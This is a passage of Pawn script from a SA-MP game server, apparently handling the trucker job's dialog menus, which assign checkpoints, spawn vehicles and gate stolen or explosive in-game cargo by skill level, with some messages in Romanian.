	            SetPlayerCheckpoint(playerid,CHKTruck[4][0],CHKTruck[4][1],CHKTruck[4][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 2;
			}
			else if(Trucker3[playerid] == 3)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[11][0],CHKTruck[11][1],CHKTruck[11][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 3;
			}
			else if(Trucker3[playerid] == 4)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[10][0],CHKTruck[10][1],CHKTruck[10][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 4;
			}
			else if(Trucker3[playerid] == 5)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[7][0],CHKTruck[7][1],CHKTruck[7][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 5;
			}
			else if(Trucker3[playerid] == 6)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[6][0],CHKTruck[6][1],CHKTruck[6][2],5.0);
				viddd[playerid] = CreateVehicle(584, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				SetVehicleHealth(GetPlayerVehicleID(playerid), 315);
				Trucker[playerid] = 6;
			}
			else if(Trucker3[playerid] == 7)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[8][0],CHKTruck[8][1],CHKTruck[8][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 7;
			}
			else if(Trucker3[playerid] == 8)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[9][0],CHKTruck[9][1],CHKTruck[9][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 8;
			}
			else if(Trucker3[playerid] == 9)
	        {
         		SetPlayerCheckpoint(playerid,CHKTruck[3][0],CHKTruck[3][1],CHKTruck[3][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 9;
			}
			else if(Trucker3[playerid] == 10)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[5][0],CHKTruck[5][1],CHKTruck[5][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 10;
			}
			else if(Trucker3[playerid] == 11)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[1][0],CHKTruck[1][1],CHKTruck[1][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 18;
			}
			else if(Trucker3[playerid] == 12)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[0][0],CHKTruck[0][1],CHKTruck[0][2],5.0);
				viddd[playerid] = CreateVehicle(584, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				SetVehicleHealth(GetPlayerVehicleID(playerid), 315);
				Trucker[playerid] = 17;
			}
			Trucker3[playerid] = 0;
		}
		else
		{
			SetTimerEx("Truckerr4", 200, 0, "i",playerid);
		}
	}
	if(dialogid == DIALOG_TRUCKER1)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
	            Trucker3[playerid] = 1;
			}
			if(listitem == 1)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods.\nUse /skills to see how many times must deliver the goods for skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
					Trucker4[playerid] = 1;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25%% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 2;
				}
			}
			if(listitem == 2)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods.\nUse /skills to see how many times must deliver the goods for skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 1;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25%% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 3;
				}
			}
			if(listitem == 3)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods.\nUse /skills to see how many times must deliver the goods for skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 1;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25%% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 4;
				}
			}
			if(listitem == 4)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 5;
			}
			if(listitem == 5)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 3)
	            {
	                format(string,sizeof(string),"You need skill 3 job trucker to carry explosive goods.\nUse /skills to see how many times must deliver the goods for skill 3.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 1;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 2)
				{
				    format(string,sizeof(string),"If you choose to deliver explosive cargo'll receive 50%% more money, but you can explode if you hit.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 6;
				}
			}
			if(listitem == 6)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 7;
			}
			if(listitem == 7)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 8;
			}
			if(listitem == 8)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 9;
			}
			if(listitem == 9)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods.\nUse /skills to see how many times must deliver the goods for skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 1;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25%% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 10;
				}
			}
			if(listitem == 10)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 11;
			}
			if(listitem == 11)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 3)
	            {
	                format(string,sizeof(string),"You need skill 3 job trucker to carry explosive goods. \nUse /skills to see how many times must deliver goods to skill 3.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 1;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 2)
				{
				    format(string,sizeof(string),"Daca alegi sa livrezi marfa exploziva vei primi cu 50%% mai multi bani, dar poti exploda daca esti lovit.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 12;
				}
			}
			if(listitem == 12)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 13;
			}
			if(listitem == 13)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods. \nUse /skills to see how many times must deliver goods to skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 1;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25 %% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 14;
				}
			}
			if(listitem == 14)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods. \nUse /skills to see how many times must deliver goods to skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 1;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25 %% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 15;

				}
			}
			if(listitem == 15)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 16;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_TRUCKER2)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods. \nUse /skills to see how many times must deliver goods to skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 2;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25 %% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT2, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 1;

				}
			}
			if(listitem == 1)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods. \nUse /skills to see how many times must deliver goods to skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 2;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25 %% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT2, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 2;

				}
			}
			if(listitem == 2)
	        {
	           	format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT2, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 3;
			}
			if(listitem == 3)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 3)
	            {
	                format(string,sizeof(string),"You need skill 3 job trucker to carry explosive goods. \nUse /skills to see how many times must deliver goods to skill 3.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 2;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 2)
				{
				    format(string,sizeof(string),"Daca alegi sa livrezi marfa exploziva vei primi cu 50%% mai multi bani, dar poti exploda daca esti lovit.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT2, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 4;
				}
			}
			if(listitem == 4)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT2, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 5;
			}
			if(listitem == 5)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT2, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 6;
			}
			if(listitem == 6)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 3)
	            {
	                format(string,sizeof(string),"You need skill 3 job trucker to carry explosive goods. \nUse /skills to see how many times must deliver goods to skill 3.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 2;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 2)
				{
				    format(string,sizeof(string),"Daca alegi sa livrezi marfa exploziva vei primi cu 50%% mai multi bani, dar poti exploda daca esti lovit.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT2, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 7;
				}
			}
			if(listitem == 7)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT2, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 8;
			}
			if(listitem == 8)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 3)
	            {
	                format(string,sizeof(string),"You need skill 3 job trucker to carry explosive goods. \nUse /skills to see how many times must deliver goods to skill 3.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 2;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 2)
				{
				    format(string,sizeof(string),"Daca alegi sa livrezi marfa exploziva vei primi cu 50%% mai multi bani, dar poti exploda daca esti lovit.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT2, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 9;
				}
			}
			if(listitem == 9)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT2, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 10;
			}
			if(listitem == 10)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods. \nUse /skills to see how many times must deliver goods to skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 2;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25 %% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT2, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 11;

				}
			}
			if(listitem == 11)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods. \nUse /skills to see how many times must deliver goods to skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 2;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25 %% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT2, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 12;

				}
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_TRUCKER3)
	{
	    if(response)
	    {
			if(listitem == 0)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT3, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 1;
			}
			if(listitem == 1)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods. \nUse /skills to see how many times must deliver goods to skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 3;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25 %% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT3, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 2;

				}
			}
			if(listitem == 2)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT3, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 3;
			}
			if(listitem == 3)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods. \nUse /skills to see how many times must deliver goods to skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 3;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25 %% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT3, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 4;

				}
			}
			if(listitem == 4)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT3, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 5;
			}
			if(listitem == 5)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 3)
	            {
	                format(string,sizeof(string),"You need skill 3 job trucker to carry explosive goods. \nUse /skills to see how many times must deliver goods to skill 3.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 3;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 2)
				{
				    format(string,sizeof(string),"Daca alegi sa livrezi marfa exploziva vei primi cu 50%% mai multi bani, dar poti exploda daca esti lovit.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT3, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 6;
				}
			}
			if(listitem == 6)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT3, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 7;
			}
			if(listitem == 7)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 3)
	            {
	                format(string,sizeof(string),"You need skill 3 job trucker to carry explosive goods. \nUse /skills to see how many times must deliver goods to skill 3.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 3;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 2)
				{
				    format(string,sizeof(string),"Daca alegi sa livrezi marfa exploziva vei primi cu 50%% mai multi bani, dar poti exploda daca esti lovit.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT3, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 8;
				}
			}
			if(listitem == 8)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT3, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 9;
			}
			if(listitem == 9)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods. \nUse /skills to see how many times must deliver goods to skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 3;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25 %% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT3, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 10;

				}
			}
			if(listitem == 10)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods. \nUse /skills to see how many times must deliver goods to skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 3;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25 %% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT3, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 11;

				}
			}
			if(listitem == 11)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT3, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 12;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_TRUCKER4)
	{
	    if(response)
	    {
			if(listitem == 0)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT4, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 1;
			}
			if(listitem == 1)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods. \nUse /skills to see how many times must deliver goods to skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 4;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25 %% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT4, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 2;

				}
			}
			if(listitem == 2)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods. \nUse /skills to see how many times must deliver goods to skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 4;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25 %% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT4, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 3;

				}
			}
			if(listitem == 3)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods. \nUse /skills to see how many times must deliver goods to skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 4;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25 %% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT4, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 4;

				}
			}
			if(listitem == 4)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT4, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 5;
			}
			if(listitem == 5)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 3)
	            {
	                format(string,sizeof(string),"You need skill 3 job trucker to carry explosive goods. \nUse /skills to see how many times must deliver goods to skill 3.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 4;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 2)
				{
				    format(string,sizeof(string),"Daca alegi sa livrezi marfa exploziva vei primi cu 50%% mai multi bani, dar poti exploda daca esti lovit.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT4, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 6;
				}
			}
			if(listitem == 6)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT4, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 7;
			}
			if(listitem == 7)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT4, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 8;
			}
			if(listitem == 8)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
